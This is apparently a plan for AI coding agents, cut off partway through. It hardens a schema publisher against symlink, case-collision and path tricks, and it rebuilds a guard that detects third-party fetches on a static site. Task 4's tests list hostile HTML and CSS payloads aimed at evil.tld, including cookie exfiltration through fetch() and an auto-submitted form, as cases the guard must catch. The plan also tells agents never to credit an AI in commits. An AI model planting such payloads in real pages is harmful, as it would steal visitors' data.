# Closing the deferred findings Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close 34 findings on a live site, and record 4 more, replacing two guards that keep proving incomplete with checks that fail closed.

**Architecture:** Six commits, each one coherent idea with its own tests. Two of them replace a guard rather than widening it, because widening is what three review rounds refuted.

**Tech Stack:** Python 3.13, uv, pytest, MkDocs Material, GitHub Actions.

**Spec:** `design/2026-09-05-deferred-findings-design.md` (version 3.1)

## Global Constraints

- The published schema tree must be byte-identical before and after this work. 44 files. Verify by diff, not by count. This promise covers the schema tree only. Task 6 changes the landing page's inlined SVG on purpose.
- No published URI changes. `$id` values are untouched by every task here.
- American English. Active voice. No em dash anywhere, in prose, comments, docstrings, or commit messages. No semicolons in prose.
- Avoid: just, very, really, actually, certainly, basically, literally, utilize, facilitate, leverage, robust, seamless, transformative, comprehensive, holistic, unlock, unleash, empower.
- Comment the why, not the what. No commented-out code. No placeholder implementations.
- Never credit an AI in a commit message, comment, or document. The git author stays the human.
- Every task ends with `uv run pytest -q` green before its commit. A previous version of this plan claimed that and did not deliver it: applied literally it produced 14 failures at Task 1 and a fatal collection error by Task 5. Every task below now names the existing tests it breaks.
- **Test imports.** There is no `tools/__init__.py` and no pythonpath setting, so `import tools.x` raises `ModuleNotFoundError` and, at module level, aborts collection for the entire suite. Every test file uses the convention already in this repository: `sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "tools"))` then a bare `import publish_schemas`. Shared helpers come from `conftest` by a function-local `from conftest import ...`.
- No task opens a GitHub issue, posts a comment, or takes any outward-facing action.

---

### Task 1: A schema publishes at its own location

Replaces the draft-directory name list with an identity check. This finding reopened twice, and both previous fixes argued about the wrong axis.

**Files:**
- Move: `specification/ACS/acs_schema.json` to `specification/v0.1.0/acs_schema.json`
- Modify: `tools/publish_schemas.py` (docstring, `NON_NORMATIVE`, `target_for`, `publish`)
- Modify: `tools/render_landing.py:45`
- Modify: `tests/test_publish_schemas.py`, `tests/test_render_landing.py`
- Modify: `CONTRIBUTING.md:33`, `CLAUDE.md:75`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `target_for(doc: dict, path: Path, source: Path) -> str`. The third parameter is new and required.

- [ ] **Step 1: Update every existing call site the signature change breaks**

`target_for` gains a required third parameter, so all of these fail with `TypeError` until updated. This is the step the previous plan omitted, and it is the reason it produced 14 failures.

In `tests/test_publish_schemas.py`, add `, Path(".")` as the third argument to each `target_for` call:
- `test_target_for_strips_the_namespace_base` (line 31)
- `test_target_for_rejects_a_missing_id` (line 36)
- `test_target_for_rejects_an_out_of_namespace_id` (line 41)
- `test_target_for_rejects_unsafe_publish_paths` (line 60, eight parametrizations)

`Path(".")` works because each of these passes a bare relative path such as `Path("a")`, and `Path("a").relative_to(Path("."))` returns `a`. The first test's `$id` tail is `v0.1.0/acs_schema.json` while its path is `a`, so it now needs a matching pair:

```python
def test_target_for_strips_the_namespace_base():
    path = Path("v0.1.0/acs_schema.json")
    assert target_for({"$id": BASE + "v0.1.0/acs_schema.json"}, path, Path(".")) == \
        "v0.1.0/acs_schema.json"
```

Rewrite `test_publish_places_files_at_their_declared_id_path` (line 89), which asserts the exact behavior this task forbids. It writes `ACS/acs_schema.json` declaring `v0.1.0/acs_schema.json`:

```python
def test_publish_places_files_at_their_declared_id_path(tmp_path):
    src = tmp_path / "spec"
    write_schema(src, "v0.1.0/acs_schema.json", BASE + "v0.1.0/acs_schema.json")
    assert publish(src, tmp_path / "out") == ["v0.1.0/acs_schema.json"]
```

Fix `test_publish_rejects_a_duplicate_id`. It writes `a.json` and `b.json` sharing one `$id` tail, so the identity check now fires before the duplicate check. Give both files paths matching their own `$id` and collide on a third:

```python
def test_publish_rejects_a_duplicate_id(tmp_path):
    """Two files, each honest about its own location, both claiming one $id."""
    src = tmp_path / "spec"
    write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json")
    (src / "v0.1.0" / "b.json").write_text(
        json.dumps({"$id": BASE + "v0.1.0/a.json"}), encoding="utf-8"
    )
    with pytest.raises(SchemaError, match="but the file sits at"):
        publish(src, tmp_path / "out")
```

The duplicate-`$id` branch is now unreachable through `publish`, because two files cannot both match a single tail. Keep the branch as belt and braces and say so in a comment, since `publish` is not `target_for`'s only possible caller.

In `tests/test_render_landing.py`, `test_spec_version_returns_the_highest_of_several` breaks the same way. Its fixture writes files whose paths do not match their `$id` tails. Correct the fixture so each file sits at the path its `$id` names.

- [ ] **Step 2: Move `write_schema` into `conftest.py`**

Task 3 needs it in a second test file. Cut the helper from `tests/test_publish_schemas.py:19-25` into `tests/conftest.py` verbatim, and import it back with a function-local `from conftest import write_schema` in each file that uses it, matching how `third_party_hosts` is already imported.

- [ ] **Step 3: Write the failing tests**

Replace the existing non-normative test in `tests/test_publish_schemas.py`:

```python
DRAFT_DIRS = [
    "proposals", "Proposals", "PROPOSALS", "proposal", "drafts", "draft",
    "_drafts", "draft-v2", "drafty", "wip", "experimental", "sandbox",
    "staging", "rc", "preview", "candidate", "unreleased", "incubator",
    "beta", "pending", "scratch", "playground", "prototype",
    "ｐｒｏｐｏｓａｌｓ",   # fullwidth
    "dra‍ft",                                               # zero-width joiner
    "prоposаls",                                       # Cyrillic homoglyphs
]


@pytest.mark.parametrize("directory", DRAFT_DIRS)
def test_no_directory_name_can_claim_the_normative_namespace(tmp_path, directory):
    """The old check was a name list, so it only refused names already on it.

    These are the complement the list could not cover, including three that render
    identically to a blocked word in a diff.
    """
    src = tmp_path / "spec"
    write_schema(src, f"{directory}/nested/sneak.json", BASE + "v0.1.0/sneak.json")
    with pytest.raises(SchemaError, match="but the file sits at"):
        publish(src, tmp_path / "out")


def test_a_draft_declaring_its_own_location_is_refused_by_the_tail_pattern(tmp_path):
    """The honest form fails too, so a draft has no way through at all."""
    src = tmp_path / "spec"
    write_schema(src, "proposals/honest.json", BASE + "proposals/honest.json")
    with pytest.raises(SchemaError, match="not a safe publish path"):
        publish(src, tmp_path / "out")
```

- [ ] **Step 4: Run them to verify they fail**

Run: `uv run pytest tests/test_publish_schemas.py -q`
Expected: 38 failures. The 26 parametrized cases fail because those directory names
publish today, and eleven call sites plus the duplicate-id test fail with `TypeError`
because Step 1 moved them to the three-argument form before Step 6 changes the
signature. Both clear by Step 8, which is the step that gates the commit.

- [ ] **Step 5: Move the one file that breaks the identity**

```bash
git mv specification/ACS/acs_schema.json specification/v0.1.0/acs_schema.json
rmdir specification/ACS
```

Verify the identity now holds for all 44:

```bash
uv run python - <<'PY'
import json, pathlib
BASE = "https://genai-security-project.github.io/agent-control-standard/schema/"
src = pathlib.Path("specification")
bad = [p for p in src.rglob("*.json")
       if json.loads(p.read_text()).get("$id", "")[len(BASE):] != p.relative_to(src).as_posix()]
print(f"schemas={len(list(src.rglob('*.json')))} mismatched={len(bad)}")
PY
```

Expected: `schemas=44 mismatched=0`

- [ ] **Step 6: Replace the name list with the identity check**

In `tools/publish_schemas.py`, delete these two lines:

```python
# Draft schemas live here. They must never publish to a normative URI.
NON_NORMATIVE = ("proposals",)
```

Replace `target_for` entirely:

```python
def target_for(doc: dict, path: Path, source: Path) -> str:
    """Return the validated publish path a document's $id declares.

    The $id must name the file's own location under source. That identity is what
    keeps a draft out of the normative namespace. Claiming it would mean declaring
    an $id that names the draft directory, and SAFE_TAIL refuses that for want of a
    version segment. No directory name is involved, so nothing needs extending when
    someone invents a new word for "not ready yet".
    """
    sid = doc.get("$id")
    if not sid:
        raise SchemaError(f"{path}: no $id")
    if not sid.startswith(BASE):
        raise SchemaError(f"{path}: $id outside namespace: {sid}")

    tail = sid[len(BASE) :]
    if unquote(tail) != tail:
        raise SchemaError(f"{path}: $id must not be percent-encoded: {sid}")
    if not SAFE_TAIL.match(tail):
        raise SchemaError(
            f"{path}: $id tail {tail!r} is not a safe publish path. "
            "Expected v<version>/<name>.json with no traversal and no absolute prefix."
        )
    on_disk = path.relative_to(source).as_posix()
    if tail != on_disk:
        raise SchemaError(
            f"{path}: $id declares {tail!r} but the file sits at {on_disk!r}. "
            "A schema publishes at its own location, so the two must match."
        )
    return tail
```

Replace the module docstring's first paragraph:

```python
"""Publish JSON schemas to the paths their own $id values declare.

Every schema sits at the path its $id names, so publishing is a copy and the check
that a draft is not claiming a normative URI is an identity test rather than a list
of directory names to keep extending.

$id is attacker-influenced input, not trusted identity. Anyone who can land a file under
specification/ controls the string, and a fork pull request reaches this code on the
runner before review. Every path derived from it is validated and contained.
"""
```

- [ ] **Step 7: Update the two production callers**

In `publish()`: `rel = target_for(doc, path)` becomes `rel = target_for(doc, path, source)`.

In `tools/render_landing.py:45`: `target_for(doc, path)` becomes `target_for(doc, path, source)`.

- [ ] **Step 8: Run the tests and check the real tree**

Run: `uv run pytest -q`
Expected: PASS, with no failures anywhere in the suite.

```bash
uv run python tools/publish_schemas.py specification /tmp/t1 && find /tmp/t1 -type f | wc -l
```

Expected: `published 44 schemas` and `44`. Count files, not directory entries. `ls /tmp/t1/v0.1.0 | wc -l` reports 14, because it counts each subdirectory as one entry, and would hide 27 dropped files under `hooks/`.

- [ ] **Step 9: Update the two documents naming the old path**

`CONTRIBUTING.md:33` and `CLAUDE.md:75`: `specification/ACS/acs_schema.json` becomes `specification/v0.1.0/acs_schema.json`.

Add to the Schema namespace section of `CLAUDE.md`, after the paragraph beginning "`$id` is identity, not a fetch target." (line 135):

```markdown
Every schema sits at the path its `$id` names, relative to `specification/`. That identity
is the check that keeps a draft out of the normative namespace, so a new schema goes at the
path its `$id` declares and nowhere else.
```

- [ ] **Step 10: Commit**

```bash
git add specification tools/publish_schemas.py tools/render_landing.py tests/ \
        CONTRIBUTING.md CLAUDE.md
git commit -F - <<'MSG'
Require a schema's $id to match its location

The draft-directory check was a name list. Two rounds of review argued about
what belonged on the list and how deep to match, and both were the wrong axis:
a list cannot enumerate its complement. Measured against the six-name version,
26 directory names still published a draft to the normative namespace, three of
them Unicode variants that render as the blocked word in a diff.

One schema had an $id tail that differed from its path. Moving it makes the two
identical for all 44, which turns the check into an identity test. A draft
claiming the normative namespace now has to declare an $id naming its own draft
directory, and SAFE_TAIL refuses that for want of a version segment. A draft
declaring its honest location is refused the same way.

No published URI changes. The publish output is byte-identical.
MSG
```

---

### Task 2: Write only what validation read, from inside the source tree

**Files:**
- Modify: `tools/publish_schemas.py` (`load_schemas`, new `_read`, `publish`)
- Modify: `tests/test_publish_schemas.py`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1.
- Produces: `_read(source: Path) -> dict[Path, tuple[dict, bytes]]`. `load_schemas(source) -> dict[Path, dict]` keeps its signature.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_publish_schemas.py`. Note `write_schema`'s keyword is `body`, not `extra`:

```python
def test_a_dangling_ref_leaves_no_output_directory(tmp_path):
    """Absence, not emptiness. An implementation that mkdirs first satisfies 'empty'."""
    src = tmp_path / "spec"
    out = tmp_path / "out"
    write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json",
                 body={"properties": {"x": {"$ref": BASE + "v0.1.0/gone.json"}}})
    with pytest.raises(SchemaError, match="which no \\$id publishes"):
        publish(src, out)
    assert not out.exists()


def test_the_written_bytes_are_the_bytes_that_were_parsed(tmp_path, monkeypatch):
    """A second read at write time could substitute content nothing validated.

    Mutating the file the instant parsing finishes proves which read feeds the write.
    """
    import publish_schemas as ps

    src = tmp_path / "spec"
    out = tmp_path / "out"
    target = write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json")
    real_read = ps._read

    def read_then_tamper(source):
        parsed = real_read(source)
        target.write_bytes(b'{"$id": "tampered, never validated"}')
        return parsed

    monkeypatch.setattr(ps, "_read", read_then_tamper)
    ps.publish(src, out)
    written = json.loads((out / "v0.1.0/a.json").read_text())
    assert written["$id"] == BASE + "v0.1.0/a.json"


def test_a_symlink_out_of_the_source_tree_is_refused(tmp_path):
    """The symlink's own path satisfies every check while its target supplies bytes.

    Without resolving, any file on the runner becomes publishable as a schema by
    adding one three-line, self-consistent-looking entry under specification/.
    """
    src = tmp_path / "spec"
    (src / "v0.1.0").mkdir(parents=True)
    outside = tmp_path / "secret.json"
    outside.write_text(json.dumps({"$id": BASE + "v0.1.0/c.json", "token": "leak"}))
    (src / "v0.1.0" / "c.json").symlink_to(outside)
    with pytest.raises(SchemaError, match="resolves outside"):
        publish(src, tmp_path / "out")


def test_two_paths_differing_only_by_case_are_refused(tmp_path):
    """A case-insensitive filesystem collapses these into one file.

    A Linux commit or the GitHub web editor can carry both. CI would publish two
    schemas while a maintainer's local checkout shows one, so the tree a human
    verifies is not the tree that deploys.
    """
    src = tmp_path / "spec"
    write_schema(src, "v0.1.0/a.json", BASE + "v0.1.0/a.json")
    upper = src / "v0.1.0" / "A.json"
    if upper.exists():
        pytest.skip("case-insensitive filesystem cannot hold both names")
    write_schema(src, "v0.1.0/A.json", BASE + "v0.1.0/A.json")
    with pytest.raises(SchemaError, match="differs from"):
        publish(src, tmp_path / "out")
```

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_publish_schemas.py -q`
Expected: the dangling-ref test fails on `assert not out.exists()`, the bytes test on `AttributeError: module 'publish_schemas' has no attribute '_read'`, the symlink test publishes the secret instead of raising, and the case test either raises the wrong message or skips on macOS.

- [ ] **Step 3: Keep the bytes with the parsed document, and refuse a symlink out of the tree**

Replace `load_schemas` in `tools/publish_schemas.py`:

```python
def _read(source: Path) -> dict[Path, tuple[dict, bytes]]:
    """Parse every JSON file under source that declares an $id, keeping its raw bytes.

    The bytes travel with the parsed document so the publish step writes what it
    validated. Re-reading at write time would leave a window that widens with every
    file, because the whole package is validated in between.

    Files without an $id are skipped rather than fatal. Example payloads and fixtures
    live under specification/ too, and a contributor adding one must not stop the deploy.
    """
    root = source.resolve()
    schemas: dict[Path, tuple[dict, bytes]] = {}
    for path in sorted(source.rglob("*.json")):
        # A symlink's own path satisfies every check above while its target supplies
        # the bytes, so resolve first and require the real file to sit inside source.
        if not path.resolve().is_relative_to(root):
            raise SchemaError(f"{path}: resolves outside {source}, refusing to read it")
        raw = path.read_bytes()
        try:
            doc = json.loads(raw.decode("utf-8"))
        except UnicodeDecodeError as error:
            raise SchemaError(f"{path}: not valid UTF-8: {error}") from error
        except json.JSONDecodeError as error:
            raise SchemaError(f"{path}: invalid JSON: {error}") from error
        if not isinstance(doc, dict) or "$id" not in doc:
            continue
        schemas[path] = (doc, raw)
    return schemas


def load_schemas(source: Path) -> dict[Path, dict]:
    """Parse every JSON file under source that declares an $id."""
    return {path: doc for path, (doc, _raw) in _read(source).items()}
```

- [ ] **Step 4: Validate everything before writing anything**

Replace the body of `publish()`:

```python
def publish(source: Path, out: Path) -> list[str]:
    """Write every schema to its $id-declared path. Return sorted relative paths.

    Nothing is written until every schema validates and every $ref resolves, so a
    failed build leaves no output directory rather than a partial one. The bytes
    written are the bytes parsed, so no second read can substitute content that
    nothing checked.
    """
    parsed = _read(source)
    if not parsed:
        raise SchemaError(f"no schemas found under {source}")

    out_root = out.resolve()
    by_id: dict[str, dict] = {}
    seen: dict[str, Path] = {}
    claimed: dict[str, str] = {}
    planned: list[tuple[Path, str, bytes]] = []

    for path, (doc, raw) in parsed.items():
        rel = target_for(doc, path, source)
        sid = doc["$id"]
        # Belt and braces. The identity check makes two files sharing one $id
        # unreachable through this function, but target_for has other callers.
        if sid in seen:
            raise SchemaError(f"{path}: duplicate $id {sid}, already declared by {seen[sid]}")
        seen[sid] = path

        # A case-insensitive filesystem collapses two of these into one file, so the
        # tree a maintainer checks out is not the tree the Linux runner publishes.
        folded = rel.casefold()
        if folded in claimed:
            raise SchemaError(
                f"{path}: publishes to {rel!r}, which differs from {claimed[folded]!r} "
                "only by case, so the two collide on a case-insensitive filesystem"
            )
        claimed[folded] = rel

        destination = (out / rel).resolve()
        # Belt and braces. SAFE_TAIL should make this unreachable. If it ever is
        # reachable, the build stops rather than writing outside the artifact.
        if not destination.is_relative_to(out_root):
            raise SchemaError(f"{path}: $id escapes the output root: {sid}")

        planned.append((destination, rel, raw))
        by_id[sid] = doc

    verify_refs({path: doc for path, (doc, _raw) in parsed.items()}, by_id)

    for destination, _rel, payload in planned:
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(payload)
    return sorted(rel for _destination, rel, _payload in planned)
```

`shutil` is now unused in this module. Remove the import.

- [ ] **Step 5: Run the tests, then diff the published tree**

Run: `uv run pytest -q`
Expected: PASS.

```bash
uv run python tools/publish_schemas.py specification /tmp/t2 >/dev/null
diff -r /tmp/t1 /tmp/t2 && echo IDENTICAL
```

Expected: `IDENTICAL`, against the tree Task 1 Step 8 wrote.

- [ ] **Step 6: Commit**

```bash
git add tools/publish_schemas.py tests/test_publish_schemas.py
git commit -F - <<'MSG'
Validate every schema before writing any of them

publish() wrote each file as it validated it, so a failure partway through left
a directory holding part of the package. The output is a published namespace,
and a half-written one is worse than none.

The bytes now travel with the parsed document. The previous attempt at this
claimed to write the bytes validation read and did not: load_schemas called
read_text to parse and discarded it, then the publish loop called read_bytes
again. Two reads, with the whole package validated in between.

Two reads of a different kind are also closed. A symlink under specification/
passed every path check on its own name while its target supplied the bytes,
which made any JSON-shaped file on the runner publishable to the live site by
adding one entry that reads like an ordinary schema. Paths now resolve before
they are read. And two schemas whose paths differ only by case are refused,
because a case-insensitive filesystem collapses them, so a maintainer checking
out the tree locally would not see what the Linux runner publishes.
MSG
```

---

### Task 3: One load, one version key, two honest tests

**Files:**
- Modify: `tools/render_landing.py`
- Modify: `tests/test_render_landing.py`

**Interfaces:**
- Consumes: `target_for(doc, path, source)` from Task 1, `write_schema` from `conftest`.
- Produces: `_version_key(version)`, `_versions(source) -> dict[str, int]`, `_schema_facts(source) -> tuple[str, int]`.

- [ ] **Step 1: Write the failing tests**

`tests/test_render_landing.py` currently imports only named functions (`from render_landing import ...`). These tests reach module attributes, so add a bare `import render_landing` alongside it. There is no existing copy-failure test, so this adds one rather than replacing one.

```python
@pytest.fixture
def multi_version_tree(tmp_path):
    """Two versions, with the newer holding fewer schemas.

    Both numbers differ from the total, or an assertion cannot tell "count within
    the reported version" from "count everything".
    """
    from conftest import write_schema

    src = tmp_path / "spec"
    for name in ("a", "b", "c"):
        write_schema(src, f"v0.2.0/{name}.json", BASE + f"v0.2.0/{name}.json")
    for name in ("d", "e"):
        write_schema(src, f"v0.10.0/{name}.json", BASE + f"v0.10.0/{name}.json")
    return src


def test_the_count_belongs_to_the_version_it_is_printed_beside(multi_version_tree):
    version, count = render_landing._schema_facts(multi_version_tree)
    assert version == "v0.10.0"
    assert count == 2, "counting all five states a number about the wrong version"


def test_version_order_is_numeric_not_lexicographic(multi_version_tree):
    """v0.10.0 sorts above v0.2.0 only under a numeric key.

    The single-version fixture this replaced could not tell the two apart, so a
    deliberately broken comparison still passed.
    """
    assert render_landing._schema_facts(multi_version_tree)[0] == "v0.10.0"
    assert render_landing.spec_version(multi_version_tree) == "v0.10.0"


def test_main_reports_a_copy_failure_without_a_traceback(tmp_path, monkeypatch, capsys):
    """The fixture carries every placeholder, or render raises before the copy.

    main() resolves the schema source from __file__, not the working directory, so
    it reads the real specification/ tree and no chdir is needed.
    """
    landing = tmp_path / "landing"
    (landing / "assets").mkdir(parents=True)
    (landing / "index.html").write_text("".join(render_landing.REQUIRED_PLACEHOLDERS))
    (landing / "assets" / "starburst.svg").write_text("<svg></svg>")

    def boom(*args, **kwargs):
        raise OSError("assets unreadable")

    monkeypatch.setattr(render_landing.shutil, "copytree", boom)
    assert render_landing.main(["render_landing.py", str(landing), str(tmp_path / "out")]) == 1
    assert "assets unreadable" in capsys.readouterr().err
```

The copy test needs the template to survive placeholder validation and the workstream table to parse, so it renders against the real `GOVERNANCE.md`. If `REQUIRED_PLACEHOLDERS` joined bare does not satisfy the survivor check in `render`, wrap each token in surrounding text rather than weakening the check.

- [ ] **Step 2: Run them to verify they fail**

Run: `uv run pytest tests/test_render_landing.py -q`
Expected: the first two fail with `AttributeError: module has no attribute '_schema_facts'`. The copy test fails with an `OSError` traceback rather than a return code of 1.

- [ ] **Step 3: Share the version logic**

Replace `_versions`, `spec_version`, and `schema_count` in `tools/render_landing.py`:

```python
def _version_key(version: str) -> tuple[int, ...]:
    """Order versions numerically, so v0.10.0 sorts above v0.2.0 rather than below it."""
    return tuple(int(part) for part in version.lstrip("v").split("."))


def _versions(source: Path) -> dict[str, int]:
    """Map each spec version present to the number of schemas it publishes."""
    try:
        docs = load_schemas(source)
        counts: dict[str, int] = {}
        for path, doc in docs.items():
            version = target_for(doc, path, source).split("/")[0]
            counts[version] = counts.get(version, 0) + 1
        return counts
    except SchemaError as error:
        raise RenderError(str(error)) from error


def _schema_facts(source: Path) -> tuple[str, int]:
    """Return the newest spec version and how many schemas that version publishes.

    Old versions stay published so their $id URIs keep resolving, so more than one
    version is the expected steady state. Counting across all of them would print a
    total beside a single version name and say something false about that version.
    """
    counts = _versions(source)
    if not counts:
        raise RenderError(f"no schemas found under {source}")
    version = max(counts, key=_version_key)
    return version, counts[version]


def spec_version(source: Path) -> str:
    return _schema_facts(source)[0]


def schema_count(source: Path) -> int:
    return _schema_facts(source)[1]
```

- [ ] **Step 4: Load once in render**

```python
    version, count = _schema_facts(source)
    out = template.replace("<!--ACS:SPEC_VERSION-->", html.escape(version))
    out = out.replace("<!--ACS:SCHEMA_COUNT-->", str(count))
```

The `SCHEMA_HREF` line already uses `version` and needs no change.

- [ ] **Step 5: Widen the error boundary in main**

Move `out.mkdir`, the `index.html` write, and `shutil.copytree` inside the existing `try`. Give the output phase its own clause, keeping the existing one for reading the landing sources so a reader can tell which half failed. `shutil.Error` subclasses `OSError`, so one clause covers both:

```python
    except OSError as error:
        print(f"error: cannot write the rendered site: {error}", file=sys.stderr)
        return 1
```

- [ ] **Step 6: Run the tests and check the rendered page**

Run: `uv run pytest -q`
Expected: PASS.

```bash
uv run python tools/render_landing.py landing /tmp/r1 && \
  grep -c 'v0\.1\.0' /tmp/r1/index.html && grep -cE '>44<|44 schemas' /tmp/r1/index.html
```

Expected: non-zero counts for both. The live page must still read `v0.1.0` and `44`.

- [ ] **Step 7: Commit**

```bash
git add tools/render_landing.py tests/test_render_landing.py
git commit -F - <<'MSG'
Share the version logic and count within the version reported

render() loaded and parsed the schema tree twice, once for the version and once
for the count, and the numeric version comparison existed in one of the two
paths while the other used a plain max. A divergence ships a wrong version to
the live page.

The count now belongs to the version printed beside it. Counting every schema in
the repository while naming one version says something false about that version,
and it goes live the day a second version ships.

Two new tests cover behavior nothing covered. The repository had no copy-failure
test at all, so widening the error boundary had none. The version test that exists uses
a single-version fixture, which cannot tell a numeric comparison from a
lexicographic one, so a deliberately broken comparison passes it. The new
fixture holds two versions and makes both counts differ from the total, or an
assertion cannot tell counting within a version from counting everything.
MSG
```

---

### Task 4: Invert the third-party guard

**Files:**
- Modify: `tests/conftest.py`
- Create: `tests/test_third_party_guard.py`
- Modify: `tests/test_site_config.py:59-63`, `tests/test_landing_page.py:51-54`

**Interfaces:**
- Consumes: nothing from earlier tasks.
- Produces: `third_party_hosts(markup, self_hosts) -> set[str]` (now includes base hrefs), `external_bases(markup) -> list[str]`, `stylesheet_hosts(css, self_hosts) -> set[str]`, `VENDORED_PREFIXES: tuple[str, ...]`. The names `RESOURCE_TAG`, `IMPORT_RULE`, and `URL_FUNC` are removed.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_third_party_guard.py`:

```python
"""The guard has been found incomplete five times. It is tested by its bypasses."""
import pytest

from conftest import external_bases, stylesheet_hosts, third_party_hosts

SELF = {"genai-security-project.github.io"}

MUST_CATCH = {
    "base href": '<base href="https://evil.tld/"><img src="logo.png">',
    "inline script body": '<script>fetch("https://evil.tld/b?"+document.cookie)</script>',
    "svg use href": '<svg><use href="https://evil.tld/s.svg#x"></use></svg>',
    "svg image href": '<svg><image href="https://evil.tld/i.png"/></svg>',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=https://evil.tld/">',
    "css image-set": '<style>b{background:image-set("https://evil.tld/a.png" 1x)}</style>',
    "tab inside the scheme": '<img src="ht\tps://evil.tld/x.png">',
    "second attribute on one tag":
        '<video src="//genai-security-project.github.io/a.mp4" poster="//evil.tld/b.jpg">',
    "anchor ping": '<a href="/local" ping="https://evil.tld/beacon">x</a>',
    "unquoted src": "<img src=//evil.tld/x.png>",
    "srcset second url": '<img srcset="/a.png 1x, //evil.tld/b.png 2x">',
    "link stylesheet": '<link rel="stylesheet" href="https://evil.tld/s.css">',
    "iframe": '<iframe src="https://evil.tld/f"></iframe>',
    "object data": '<object data="https://evil.tld/o"></object>',
    "auto-submitted form":
        '<form id="f" action="https://evil.tld/collect"></form>'
        '<script>document.getElementById("f").submit()</script>',
    "input formaction": '<input type="submit" formaction="https://evil.tld/go">',
    "anchor rel=prefetch": '<a rel="prefetch" href="https://evil.tld/x">y</a>',
    "anchor rel=preconnect": '<a rel="preconnect" href="https://evil.tld/">y</a>',
    "entity-encoded scheme": '<img src="&#104;ttps://evil.tld/x.png">',
    "uppercase scheme": '<img src="HTTPS://evil.tld/x.png">',
}

MUST_IGNORE = {
    "prose anchor": '<p>See <a href="https://github.com/owasp/x">the repo</a>.</p>',
    "blockquote cite": '<blockquote cite="https://example.org/z">q</blockquote>',
    "self-hosted asset": '<img src="https://genai-security-project.github.io/a.png">',
    "relative asset": '<img src="assets/a.png"><link rel="stylesheet" href="s.css">',
    "javascript line comment": "<script>\n// see https not a url\nvar x=1;\n</script>",
    "svg namespace": '<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>',
    "anchor rel=noopener": '<a href="https://github.com/x" rel="noopener">r</a>',
    "anchor rel=edit": '<a href="https://github.com/x/edit" rel="edit">e</a>',
    "html comment": "<!-- https://evil.tld/x --><p>ok</p>",
    "self-closed script then prose":
        '<script src="/a.js"/><p>See https://good.example.com for more.</p>',
}

CSS_CATCH = {
    "url absolute": "a{background:url(https://evil.tld/x.png)}",
    "url protocol-relative": "a{background:url(//evil.tld/x.png)}",
    "import string": '@import "https://evil.tld/s.css";',
    "import url": "@import url(//evil.tld/s.css);",
    "image-set": 'a{background:image-set("https://evil.tld/a.png" 1x)}',
    "font-face src": "@font-face{src:url(https://evil.tld/f.woff2)}",
}

CSS_IGNORE = {
    "data uri holding an svg":
        "a{background:url(\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>\")}",
    "licence comment": "/* icons from https://fontawesome.com */a{color:red}",
    "self host": "a{background:url(https://genai-security-project.github.io/a.png)}",
    "relative": "a{background:url(../img/a.png)}",
}


@pytest.mark.parametrize("markup", MUST_CATCH.values(), ids=list(MUST_CATCH))
def test_every_known_bypass_is_caught(markup):
    assert "evil.tld" in third_party_hosts(markup, SELF)


@pytest.mark.parametrize("markup", MUST_IGNORE.values(), ids=list(MUST_IGNORE))
def test_prose_and_self_hosted_references_are_not_fetches(markup):
    assert third_party_hosts(markup, SELF) == set()


@pytest.mark.parametrize("css", CSS_CATCH.values(), ids=list(CSS_CATCH))
def test_stylesheet_fetches_are_caught(css):
    assert "evil.tld" in stylesheet_hosts(css, SELF)


@pytest.mark.parametrize("css", CSS_IGNORE.values(), ids=list(CSS_IGNORE))
def test_stylesheet_non_fetches_are_ignored(css):
    """A data: payload and a licence banner carry URLs that fetch nothing.

    Flagging them is what makes a team switch a guard off.
    """
    assert stylesheet_hosts(css, SELF) == set()


def test_a_base_element_is_named_by_its_own_check():
    """base rewrites resolution for the whole page, so every relative URL leaves it.

    No host appears in any other attribute afterwards, which is why a host-matching
    guard can never see it.
    """
    assert external_bases('<base href="https://evil.tld/"><img src="logo.png">')


def test_a_namespace_declaration_cannot_smuggle_a_fetch():
    markup = '<svg xmlns="http://www.w3.org/2000/svg"><use href="https://evil.tld/s#x"/></svg>'
    assert "evil.tld" in third_party_hosts(markup, SELF)
```

- [ ] **Step 2: Run it to verify it fails**

Run: `uv run pytest tests/test_third_party_guard.py -q`
Expected: `ImportError: cannot import name 'external_bases' from 'conftest'`.

- [ ] **Step 3: Replace the guard**

Replace the whole of `tests/conftest.py`, keeping the `write_schema` helper Task 1 Step 2 moved into it:

```python
"""Shared guards that keep the published site from contacting a third party.

The guard has been found incomplete five times. Every earlier version enumerated the
attributes that fetch, and each new construct was a fresh gap: a poster attribute, an
unquoted value, a stylesheet, a base element, an inline script body. So this one
enumerates the positions that do not fetch instead. Anything else carrying an absolute
URL counts as a fetch, which makes an unanticipated construct a failure rather than a
silent pass.
"""
import html.parser
import json
import re
from pathlib import Path

# Positions a browser resolves but never fetches from. Everything else is a fetch.
# Form action is deliberately absent. A form needs no click: a script calling submit()
# fires the request on load, and the URL never appears in the script text.
NON_FETCHING = frozenset({
    ("a", "href"), ("area", "href"),
    ("blockquote", "cite"), ("q", "cite"), ("ins", "cite"), ("del", "cite"),
})
# A namespace URI names a vocabulary. No browser resolves it, and the built site
# carries several hundred of them on inline SVG.
NON_FETCHING_ATTRS = frozenset({"xmlns"})
# These link types make an anchor fetch or open a connection with no click, so the
# anchor exemption does not apply when one of them is present.
SPECULATIVE_REL = frozenset({
    "prefetch", "preconnect", "dns-prefetch", "preload", "modulepreload",
})

# The URL parser strips ASCII tab and newline before resolving, so a scheme broken
# across one still fetches. Strip them before matching rather than after.
_NOISE = re.compile(r"[\t\r\n]")
# In an attribute, a protocol-relative value is a fetch.
_IN_ATTR = re.compile(r"""(?:[a-z][a-z0-9+.-]*:)?//([^\s/?#'\"),]+)""", re.I)
# In script text, require a scheme. A bare // opens a JavaScript comment far more
# often than a protocol-relative URL, and a false positive here is the kind of noise
# that gets a guard switched off.
